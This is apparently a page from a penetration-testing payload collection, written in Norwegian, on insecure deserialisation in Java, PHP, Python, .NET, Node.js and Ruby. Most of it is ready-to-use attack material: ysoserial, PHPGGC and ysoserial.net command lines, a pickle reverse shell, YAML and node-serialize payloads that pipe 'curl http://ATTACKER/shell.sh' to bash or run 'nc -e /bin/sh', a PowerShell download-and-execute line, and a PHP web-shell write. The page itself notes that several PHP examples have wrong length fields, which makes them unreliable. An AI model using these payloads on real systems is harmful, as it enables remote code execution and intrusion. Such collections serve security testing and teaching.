# 🔓 Payloads for deserialisering

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Deserialization.tr.md) • [🇬🇷 Ελληνικά](Deserialization.el.md)

> **Begreper og versjoner:** Deserialisering gjenskaper objekter fra data; gadget-kjeder og POP-kjeder krever bestemte klasser, biblioteker og programflyt. Flere PHP-eksempler har inkonsistente lengdefelt, blant annet `ClassName`; de er illustrative og ikke reparert. Phar-metadata deserialiseres ikke automatisk fra PHP 8.0; se [PHPs migreringsveiledning](https://www.php.net/manual/en/migration80.incompatible.php). Ren filtilgang er derfor ikke en universell Phar-utløser. Java-, .NET-, Ruby- og YAML-eksemplene avhenger av versjon og loader-konfigurasjon; identifikasjonsmønstre alene beviser ikke en sårbarhet. Koden er bevart.

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## ☕ Deserialisering i Java

### Deteksjon
```
# Identifikasjonsbyte (magic bytes)
AC ED 00 05    # Serialisert Java-objekt (Base64: rO0AB)
H4sIAAAA       # GZip-komprimert

# Vanlige plasseringer
- Informasjonskapsler (Base64-kodet)
- Skjulte skjemafelt
- ViewState
- API-parametere
- RMI (port 1099)
- JMX (port 9010)
```

### ysoserial – payloadgenerator
```bash
# Installer
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# Generer payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# Vanlige gadget-kjeder
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

### Payload for DNS-eksfiltrering
```bash
# Generer payload med DNS-tilbakekall
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# DNS-basert deteksjon
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

### Vanlige sårbare biblioteker
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

## 🐘 Deserialisering i PHP

### Magiske metoder
```php
__construct()    // Opprettelse av objekt
__destruct()     // Destruksjon av objekt
__wakeup()       // Deserialisering
__sleep()        // Serialisering
__toString()     // Objekt til streng
__call()         // Utilgjengelig metode
__get()          // Lesing av utilgjengelig egenskap
__set()          // Skriving til utilgjengelig egenskap
```

### Grunnleggende payload
```php
// Format for serialiserte objekter
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// Objekt med egenskaper
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Tabell (array)
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

### Type juggling (løse typesammenligninger)
```php
// Omgåelse med boolsk true
O:4:"User":1:{s:8:"password";b:1;}

// Sammenligning med heltallet 0
O:4:"User":1:{s:8:"password";i:0;}

// Omgåelse med tabellsammenligning
O:4:"User":1:{s:8:"password";a:0:{}}
```

### Payloads med POP-kjeder
```php
// Skriving til vilkårlig fil
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// Kommandokjøring via __destruct()
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

### PHPGGC – gadget-kjeder for PHP
```bash
# Installer
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# List opp gadgets
./phpggc -l

# Generer payload
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Base64-kod
./phpggc -b Laravel/RCE1 system "id"

# URL-kod
./phpggc -u Laravel/RCE1 system "id"

# Med wrapper (PHAR)
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

### Phar-deserialisering
```php
// Tilgang til Phar-filer kan utløse deserialisering
phar://path/to/phar.phar/internal-file

// Tilgangsmetoder som bruker phar://
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

## 🐍 Deserialisering i Python (Pickle)

### Grunnleggende payload
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

### Payload for omvendt shell
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Deteksjon
```
# Identifikasjonsbyte (magic bytes)
80 04 95    # Protokoll 4 (Python 3)
80 03       # Protokoll 3
80 02       # Protokoll 2

# Vanlige Base64-mønstre
gASV        # Protokoll 4
gAN         # Protokoll 3
```

### YAML-deserialisering (Python)
```yaml
# Usikker innlasting med PyYAML
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Flere kommandoer
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

## 🔷 Deserialisering i .NET

### Deteksjon
```
# ViewState
Parameteren __VIEWSTATE (Base64)

# BinaryFormatter
AAEAAAD/////    # Identifikasjonsmønster i Base64

# JSON.NET
Feltet $type i JSON
```

### ysoserial.net – payloadgenerator
```powershell
# Last ned
# https://github.com/pwntester/ysoserial.net

# Generer payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# Vanlige gadgets
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# Utnyttelse av ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### JSON.NET TypeNameHandling
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

## 🟨 JavaScript/Node.js

### node-serialize
```javascript
// Sårbar kode: unserialize(user_input)
// Payload med IIFE (Immediately Invoked Function Expression, funksjon som kjøres umiddelbart)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Omvendt shell
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

### serialize-javascript
```javascript
// Hvis eval() brukes på deserialiserte data
(function(){require('child_process').execSync('id')})()
```

---

## 🔴 Deserialisering i Ruby

### Marshal.load
```ruby
# Opprett payload
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

## 📋 Sjekkliste for testing

```markdown
□ Identifiser serialiseringsformatet (Base64, hex, identifikasjonsbyte)
□ Finn språk og rammeverk (Java, PHP, Python, .NET)
□ Finn sårbare bibliotekversjoner
□ Generer payloads med et passende verktøy
□ Test blindt med DNS-/HTTP-tilbakekall
□ Test lesing og skriving av filer
□ Test kommandokjøring
□ Prøv ulike gadget-kjeder
□ Omgå filtre (koding, komprimering)
```

---

## 🔗 Verktøyoversikt

| Språk | Verktøy | Bruk |
|----------|------|-------|
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | Egendefinert | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | Egendefinert | Manuell opprettelse av payload |

---

## 🔗 Relaterte payloads

- [SSTI-payloads](SSTI.nb.md)
- [Kommandoinjeksjon](Command-Injection.nb.md)

---

**Tilbake til payloadsamlingen:** [💉 Payloadsamling](../../README.md#-payloads-collection)
